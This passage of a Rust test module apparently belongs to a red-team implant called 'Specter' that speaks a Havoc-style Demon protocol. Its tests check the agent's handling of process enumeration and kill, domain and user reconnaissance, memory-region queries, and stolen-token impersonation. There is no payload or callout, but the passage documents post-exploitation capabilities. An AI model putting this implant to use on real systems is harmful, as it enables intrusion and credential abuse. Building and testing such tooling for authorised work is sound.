            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        // First 4 bytes must be subcmd=2 (LE)
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 2);
    }

    #[test]
    fn handle_proc_modules_echoes_pid() {
        let mut config = SpecterConfig::default();
        let mut payload = 2u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&42u32.to_le_bytes()); // arbitrary pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        assert_eq!(echoed_pid, 42);
    }

    // ── handle_proc_grep ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_grep_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec(); // subcmd = Grep
        payload.extend_from_slice(&le_utf16le_payload("nonexistent_xzy_proc_name_123"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 20, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 3, "subcmd must be echoed as 3 (Grep)");
    }

    #[test]
    fn handle_proc_grep_empty_result_when_no_match() {
        let mut config = SpecterConfig::default();
        let mut payload = 3u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&le_utf16le_payload("zzz_no_such_process_zzz_99999"));
        let package = DemonPackage::new(DemonCommand::CommandProc, 21, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // Only the subcmd field (4 bytes); no process entries.
        assert_eq!(resp.payload.len(), 4, "no match → payload must be exactly subcmd u32");
    }

    #[test]
    fn handle_proc_grep_missing_name_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Only the subcmd, no name bytes
        let payload = 3u32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandProc, 22, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn arch_from_wow64_encodes_correctly() {
        // Mirrors Phantom's convention: is_wow64=true → 86, is_wow64=false → 64.
        assert_eq!(arch_from_wow64(true), 86, "WOW64 process must report arch=86");
        assert_eq!(arch_from_wow64(false), 64, "native x64 process must report arch=64");
    }

    // ── handle_proc_memory ───────────────────────────────────────────────────

    #[test]
    fn handle_proc_memory_correct_command_id_and_subcmd() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec(); // subcmd = Memory
        payload.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
        payload.extend_from_slice(&0u32.to_le_bytes()); // filter = all
        let package = DemonPackage::new(DemonCommand::CommandProc, 30, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProc));
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 6, "subcmd must be echoed as 6 (Memory)");
    }

    #[test]
    fn handle_proc_memory_echoes_pid_and_filter() {
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1234u32.to_le_bytes()); // pid
        payload.extend_from_slice(&0x04u32.to_le_bytes()); // PAGE_READWRITE filter
        let package = DemonPackage::new(DemonCommand::CommandProc, 31, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let echoed_pid = u32::from_le_bytes(resp.payload[4..8].try_into().expect("pid"));
        let echoed_filter = u32::from_le_bytes(resp.payload[8..12].try_into().expect("filter"));
        assert_eq!(echoed_pid, 1234);
        assert_eq!(echoed_filter, 0x04);
    }

    #[test]
    fn handle_proc_memory_self_returns_regions() {
        let own_pid = std::process::id();
        let mut config = SpecterConfig::default();
        let mut payload = 6u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&own_pid.to_le_bytes()); // self
        payload.extend_from_slice(&0u32.to_le_bytes()); // all regions
        let package = DemonPackage::new(DemonCommand::CommandProc, 32, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // Header is 12 bytes (subcmd + pid + filter); must have at least one region (20 bytes).
        assert!(
            resp.payload.len() >= 12 + 20,
            "self memory query must return at least one region; payload len={}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_proc_memory_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 6u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 33, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    // ── handle_proc_kill ─────────────────────────────────────────────────────

    #[test]
    fn handle_proc_kill_nonexistent_pid_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec(); // subcmd = Kill
        payload.extend_from_slice(&9_999_999u32.to_le_bytes()); // bogus pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 40, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        let success = u32::from_le_bytes(resp.payload[4..8].try_into().expect("success"));
        let echoed_pid = u32::from_le_bytes(resp.payload[8..12].try_into().expect("pid"));
        assert_eq!(subcmd, 7, "subcmd must be echoed as 7 (Kill)");
        assert_eq!(success, 0, "kill of bogus pid must report failure");
        assert_eq!(echoed_pid, 9_999_999);
    }

    #[test]
    fn handle_proc_kill_missing_pid_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 7u32.to_le_bytes().to_vec(); // subcmd only, no pid
        let package = DemonPackage::new(DemonCommand::CommandProc, 41, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_proc_kill_payload_is_twelve_bytes() {
        // The kill response is always exactly 12 bytes: subcmd(4) + success(4) + pid(4)
        let mut config = SpecterConfig::default();
        let mut payload = 7u32.to_le_bytes().to_vec();
        payload.extend_from_slice(&1u32.to_le_bytes()); // pid=1 (init, will likely fail)
        let package = DemonPackage::new(DemonCommand::CommandProc, 42, payload);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.payload.len(), 12, "kill response must be exactly 12 bytes");
    }

    // ── handle_net ──────────────────────────────────────────────────────────

    /// Build a LE-encoded UTF-16LE length-prefixed payload (without NUL terminator)
    /// matching the format the teamserver sends.
    fn le_utf16le_net(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a CommandNet task package with the given subcommand and rest bytes.
    fn net_package(subcmd: DemonNetCommand, rest: &[u8]) -> DemonPackage {
        let mut payload = (subcmd as u32).to_le_bytes().to_vec();
        payload.extend_from_slice(rest);
        DemonPackage::new(DemonCommand::CommandNet, 1, payload)
    }

    /// Parse the first u32 LE from a response payload (the subcommand echo).
    fn resp_subcmd_le(payload: &[u8]) -> u32 {
        u32::from_le_bytes(payload[0..4].try_into().expect("subcmd"))
    }

    #[test]
    fn handle_net_unknown_subcommand_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = 0xFFu32.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_empty_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, vec![]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_domain_returns_correct_command_and_subcmd() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Domain));
        // Payload must have at least subcmd(4) + len(4) (the domain string, possibly empty).
        assert!(resp.payload.len() >= 8, "domain response must have subcmd + string length");
    }

    #[test]
    fn handle_net_domain_response_string_is_le_length_prefixed() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Domain, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // After subcmd (4 bytes), read the LE length-prefixed domain string.
        let str_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        assert_eq!(resp.payload.len(), 8 + str_len, "payload size must match header");
    }

    #[test]
    fn handle_net_logons_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("SERVER01");
        let package = net_package(DemonNetCommand::Logons, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Logons));
        // After subcmd (4 bytes), the server name should be present as UTF-16LE.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server_bytes = &resp.payload[8..8 + server_len];
        let server = decode_utf16le_null(server_bytes);
        assert_eq!(server, "SERVER01");
    }

    #[test]
    fn handle_net_logons_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        // Subcommand only, no server name.
        let package = net_package(DemonNetCommand::Logons, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_sessions_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Sessions, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Sessions));
    }

    #[test]
    fn handle_net_sessions_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Sessions, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_computer_returns_stub_with_server() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::Computer, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Computer));
        // Server name must be echoed.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
        assert_eq!(server, "CORP.LOCAL");
        // Stub: no entries after server name.
        assert_eq!(resp.payload.len(), 8 + server_len);
    }

    #[test]
    fn handle_net_dclist_returns_stub_with_server() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("CORP.LOCAL");
        let package = net_package(DemonNetCommand::DcList, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::DcList));
    }

    #[test]
    fn handle_net_share_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("FILESERV");
        let package = net_package(DemonNetCommand::Share, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Share));
    }

    #[test]
    fn handle_net_share_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Share, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    #[test]
    fn handle_net_localgroup_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("WORKSTATION");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::LocalGroup));
        // Server name echoed.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let server = decode_utf16le_null(&resp.payload[8..8 + server_len]);
        assert_eq!(server, "WORKSTATION");
    }

    #[test]
    fn handle_net_localgroup_has_groups_from_etc_group() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::LocalGroup, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // On any Linux system /etc/group has at least "root".
        // Response = subcmd(4) + server(4+N) + [group_name(4+N) + description(4+N)]...
        // So payload must be longer than just subcmd + server.
        let server_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let after_server = 8 + server_len;
        assert!(
            resp.payload.len() > after_server,
            "expected at least one group entry; payload len = {}",
            resp.payload.len()
        );
    }

    #[test]
    fn handle_net_group_echoes_subcmd_8() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("DC01");
        let package = net_package(DemonNetCommand::Group, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Group));
    }

    #[test]
    fn handle_net_users_echoes_server_and_subcmd() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("HOST01");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
        assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Users));
    }

    #[test]
    fn handle_net_users_includes_root_as_admin() {
        let mut config = SpecterConfig::default();
        let rest = le_utf16le_net("localhost");
        let package = net_package(DemonNetCommand::Users, &rest);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        // Parse response to find "root" with is_admin=true.
        let p = &resp.payload;
        let mut pos = 4; // skip subcmd
        // Skip server name.
        let server_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("len")) as usize;
        pos += 4 + server_len;
        // Iterate user entries: [name: LE-len-prefixed UTF-16LE][is_admin: u32 LE]
        let mut found_root = false;
        while pos + 4 <= p.len() {
            let name_len =
                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
            pos += 4;
            if pos + name_len + 4 > p.len() {
                break;
            }
            let name = decode_utf16le_null(&p[pos..pos + name_len]);
            pos += name_len;
            let is_admin = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("admin"));
            pos += 4;
            if name == "root" {
                assert_eq!(is_admin, 1, "root must be flagged as admin");
                found_root = true;
            }
        }
        assert!(found_root, "root user not found in user list");
    }

    #[test]
    fn handle_net_users_missing_server_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = net_package(DemonNetCommand::Users, &[]);
        assert!(matches!(
            dispatch(
                &package,
                &mut config,
                &mut TokenVault::new(),
                &mut DownloadTracker::new(),
                &mut HashMap::new(),
                &mut JobStore::new(),
                &mut Vec::new(),
            ),
            DispatchResult::Ignore
        ));
    }

    // ── CommandToken helpers ────────────────────────────────────────────────

    /// Build a CommandToken package with the given subcommand and args.
    fn token_package(subcmd: DemonTokenCommand, args: &[u8]) -> DemonPackage {
        let mut payload = (u32::from(subcmd)).to_le_bytes().to_vec();
        payload.extend_from_slice(args);
        DemonPackage::new(DemonCommand::CommandToken, 1, payload)
    }

    // ── Token::Impersonate ──────────────────────────────────────────────────

    #[test]
    fn token_impersonate_nonexistent_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        // Token ID 99 doesn't exist.
        let args = 99u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Impersonate, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        // Parse: [subcmd: u32][success: u32]
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Impersonate));
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 0); // FALSE — token not found
    }

    // ── Token::List ─────────────────────────────────────────────────────────

    #[test]
    fn token_list_empty_vault() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::List, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        // Only the subcmd header, no entries.
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));
        assert_eq!(off, resp.payload.len()); // no more data
    }

    #[test]
    fn token_list_with_entries() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        vault.add(TokenEntry {
            handle: 0xAA,
            domain_user: "DOM\\user1".to_string(),
            process_id: 100,
            token_type: TokenType::Stolen,
            credentials: None,
        });
        vault.add(TokenEntry {
            handle: 0xBB,
            domain_user: "DOM\\user2".to_string(),
            process_id: 200,
            token_type: TokenType::MakeNetwork,
            credentials: None,
        });

        let package = token_package(DemonTokenCommand::List, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };

        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));

        // Entry 0
        let idx0 = parse_u32_le(&resp.payload, &mut off).expect("idx0");
        assert_eq!(idx0, 0);
        let handle0 = parse_u32_le(&resp.payload, &mut off).expect("handle0");
        assert_eq!(handle0, 0xAA);
        let user0_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user0");
        let user0 = decode_utf16le_null(&user0_bytes);
        assert_eq!(user0, "DOM\\user1");
        let pid0 = parse_u32_le(&resp.payload, &mut off).expect("pid0");
        assert_eq!(pid0, 100);
        let type0 = parse_u32_le(&resp.payload, &mut off).expect("type0");
        assert_eq!(type0, TokenType::Stolen as u32);
        let imp0 = parse_u32_le(&resp.payload, &mut off).expect("imp0");
        assert_eq!(imp0, 0); // not impersonating

        // Entry 1
        let idx1 = parse_u32_le(&resp.payload, &mut off).expect("idx1");
        assert_eq!(idx1, 1);
        let _handle1 = parse_u32_le(&resp.payload, &mut off).expect("handle1");
        let _user1_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user1");
        let pid1 = parse_u32_le(&resp.payload, &mut off).expect("pid1");
        assert_eq!(pid1, 200);
        let type1 = parse_u32_le(&resp.payload, &mut off).expect("type1");
        assert_eq!(type1, TokenType::MakeNetwork as u32);
    }

    // ── Token::GetUid ───────────────────────────────────────────────────────

    #[test]
    fn token_getuid_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::GetUid, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::GetUid));
        // elevated: u32
        let _elevated = parse_u32_le(&resp.payload, &mut off).expect("elevated");
        // user: wbytes (length-prefixed)
        let user_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user");
        let user = decode_utf16le_null(&user_bytes);
        assert!(!user.is_empty(), "user string should not be empty");
    }

    // ── Token::Revert ───────────────────────────────────────────────────────

    #[test]
    fn token_revert_returns_respond() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::Revert, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Revert));
        // On non-Windows: revert_to_self returns Err, so success = 0.
        // On Windows: success depends on thread state.
        let _success = parse_u32_le(&resp.payload, &mut off).expect("success");
    }

    // ── Token::Remove ───────────────────────────────────────────────────────

    #[test]
    fn token_remove_nonexistent_returns_failure() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let args = 42u32.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Remove, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Remove));
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 0); // FALSE — no such token
        let returned_id = parse_u32_le(&resp.payload, &mut off).expect("token_id");
        assert_eq!(returned_id, 42);
    }

    #[test]
    fn token_remove_existing_returns_success() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let id = vault.add(TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let args = id.to_le_bytes().to_vec();
        let package = token_package(DemonTokenCommand::Remove, &args);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let _subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
        assert_eq!(success, 1); // TRUE
        assert!(vault.get(id).is_none());
    }

    // ── Token::Clear ────────────────────────────────────────────────────────

    #[test]
    fn token_clear_empties_vault() {
        use crate::token::{TokenEntry, TokenType};

        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        vault.add(TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        });

        let package = token_package(DemonTokenCommand::Clear, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
        assert_eq!(subcmd, u32::from(DemonTokenCommand::Clear));
        assert!(vault.is_empty());
    }

    // ── Token::FindTokens ───────────────────────────────────────────────────

    #[test]
    fn token_find_returns_not_supported() {
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::new();
        let package = token_package(DemonTokenCommand::FindTokens, &[]);
        let DispatchResult::Respond(resp) = dispatch(
            &package,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        ) else {
            panic!("expected Respond");
        };
        let mut off = 0;
        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
